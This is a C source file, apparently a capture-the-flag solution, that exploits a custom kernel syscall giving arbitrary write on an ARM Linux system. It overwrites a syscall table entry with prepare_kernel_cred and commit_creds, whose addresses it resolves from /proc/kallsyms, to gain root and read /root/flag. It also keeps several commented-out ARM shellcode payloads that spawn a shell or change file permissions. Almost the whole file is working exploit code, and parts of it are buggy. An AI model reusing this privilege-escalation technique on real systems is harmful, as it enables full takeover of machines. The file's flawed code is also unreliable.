// Fucks up syscalling in the system by overwirting the syscall table
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sched.h>

#define SYS_CALL_TABLE 0x8000e348
#define NR_SYS_UNUSED 223
#define sys_read 0x800BEB34
#define pc_offset_7 28 // 7 is not implemented; 7*4=28
//#define pc_offset_222 888 // 222 is not implemented; 222*4=888
#define bss_start 0x804e3b20
//#define commit_creds 0x8003f56c
#define text_start 0x80008000
#define SyS_execve 0x800c4bb0
#define sys_unlink 0x800cbf9c
/*
#define do_symlink 0x80488064
#define prepare_kernel_cred 0x8003f924
*/
/*
Memory: 57292K/112640K available (3579K kernel code, 166K rwdata, 1020K rodata, 203K init, 138K bss, 55348K reserved)
Virtual kernel memory layout:
    vector  : 0xffff0000 - 0xffff1000   (   4 kB)
    fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)
    vmalloc : 0x87000000 - 0xff000000   (1920 MB)
    lowmem  : 0x80000000 - 0x86e00000   ( 110 MB)
    modules : 0x7f000000 - 0x80000000   (  16 MB)
      .text : 0x80008000 - 0x80485f40   (4600 kB)
      .init : 0x80486000 - 0x804b8c80   ( 204 kB)
      .data : 0x804ba000 - 0x804e3b20   ( 167 kB)
       .bss : 0x804e3b20 - 0x805065d0   ( 139 kB)
*/
/*
char * SC =      "\x01\x30\x8f\xe2"
                "\x13\xff\x2f\xe1"
                "\x78\x46\x0e\x30"
                "\x01\x90\x49\x1a"
                "\x92\x1a\x08\x27"
                "\xc2\x51\x03\x37"
                "\x01\xdf\x2f\x62"
                "\x69\x6e\x2f\x2f"
                "\x73\x68";
*/

//char * SC = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x42\x72\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x59\xc0\x46";

/*
char * SC = "\x01\x30\x8f\xe2"
            "\x13\xff\x2f\xe1"
            "\x78\x46\x08\x30"
            "\x49\x1a\x92\x1a"
            "\x0b\x27\x01\xdf"
            "\x2f\x62\x69\x6e"
            "\x2f\x73\x68";
*/

//char * SC = "AAAA";
/*
char * SC = 	"\x01\x60\x8f\xe2"
			"\x16\xff\x2f\xe1"
			"\x10\x22"
			"\x79\x46"
			"\x0e\x31"
			"\x01\x20"
			"\x04\x27"
			"\x01\xdf"
			"\x24\x1b"
			"\x20\x1c"
			"\x01\x27"
			"\x01\xdf"
			"\x73\x68"
			"\x65\x6c"
			"\x6c\x2d"
			"\x73\x74"
			"\x6f\x72"
			"\x6d\x2e"
			"\x6f\x72"
			"\x67\x0a";
*/
/*
char *SC = "\x01\x60\x8f\xe2"    // add  r6, pc, #1
                  "\x16\xff\x2f\xe1"    // bx   r6
                  "\x78\x46"            // mov  r0, pc
                  "\x10\x30"            // adds r0, #16
                  "\xff\x21"            // movs r1, #255    ; 0xff
                  "\xff\x31"            // adds r1, #255    ; 0xff
                  "\x01\x31"            // adds r1, #1
                  "\x08\x27"            // adds r7, #8
                  "\x01\xdf"            // svc  1
                  "\x40\x40"            // eors r0, r0
                  "\x01\x27"            // movs r7, #1
                  "\x01\xdf"            // svc  1
                  "\x2f\x72\x6f\x6f"    // .word    0x6f6f722f
                  "\x74\x2f\x70\x77"    // .word    0x77702f74
                  "\x65\x63"            // .short   0x656e
                  "\x64";               // .byte    0x64
*/
/*
char *SC = "\x01\x60\x8f\xe2"    // add  r6, pc, #1
                  "\x16\xff\x2f\xe1"    // bx   r6
                  "\x78\x46"            // mov  r0, pc
                  "\x10\x30"            // adds r0, #16
                  "\xff\x21"            // movs r1, #255    ; 0xff
                  "\xff\x31"            // adds r1, #255    ; 0xff
                  "\x01\x31"            // adds r1, #1
                  "\x27\x27"            // adds r7, #0x27
                  "\x01\xdf"            // svc  1
                  "\x40\x40"            // eors r0, r0
                  "\x01\x27"            // movs r7, #1
                  "\x01\xdf"            // svc  1
                  "\x2f\x72\x6f\x6f"    // .word    0x6f6f722f
                  "\x74\x2f\x70\x77"    // .word    0x77702f74
                  "\x65\x63"            // .short   0x656e
                  "\x64";               // .byte    0x64

*/
/* thanks spender... */
unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	int ret;
	int rep = 0;
	int oldstyle = 0;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		oldstyle = 1;
	}

repeat:
	ret = 0;
	while(ret != EOF) {
		if (!oldstyle)
			ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		else {
			ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
			if (ret == 2) {
				char *p;
				if (strstr(sname, "_O/") || strstr(sname, "_S."))
					continue;
				p = strrchr(sname, '_');
				if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (p > (char *)sname && *(p - 1) == '_')
						p--;
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			fprintf(stdout, " [+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	if (rep)
		return 0;
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int main()
{
	unsigned int * info = (unsigned int *)malloc(sizeof(unsigned int *));
    int i = 0;
    printf("[*] Addr of info: %p\n", info);
    
    /*
    char * payload = (char *)malloc(strlen(SC));
    memcpy(payload, SC, strlen(SC));
    size_t sizeof_payload = sizeof(&payload);

    printf("[*] Addr of payload %p\n", payload);
    sleep(1);
    
    // Write to bss the shellcode
    syscall(223, payload, (char *)(unsigned int *)bss_start);

    // Check if written correctly
    syscall(223, (char *)(unsigned int *)bss_start ,payload);
    int fd = open("/tmp/out", O_WRONLY);
    printf("sizeof_payload: %d \n", sizeof_payload);
    write(fd, &payload, sizeof_payload);
    */

    // Write address of prepare_kernel_cred
    prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");
    info[0] = prepare_kernel_cred;
    printf("[*] info[0]: %p \n", info[0]);
    syscall(223, (char *)info, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
    //commit_creds(prepare_kernel_cred(0));
    
    // check write
    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)info); 
    printf("[*] check write prepare_kernel_cred: info[0]: %p \n", info[0]);

    struct task_struct * kernel_cred;
    kernel_cred = syscall(7, 0);
    printf("[*] kernel_cred: %p \n", kernel_cred);

    //Write address of commit_creds
    commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
    info[0] = commit_creds;
    printf("[*] info[0]: %p \n", info[0]);
    syscall(223, (char *)info, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!

    // check write
    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)info); 
    printf("[*] check write commit_creds info[0]: %p \n", info[0]);


    syscall(7, &kernel_cred);
    
    printf("uid: %d \n", getuid());

    if(getuid()) {
        printf("No root\n");
	}
    else{
        printf("Pwned?\n");
    }

    FILE *f = fopen("/root/flag", O_RDONLY);
    fprintf(stdout, f);
    /*
    // Print commit_creds?
    syscall(223, commit_creds, (char *)info);
    printf("commit_creds?: %x \n", &info);
    */
}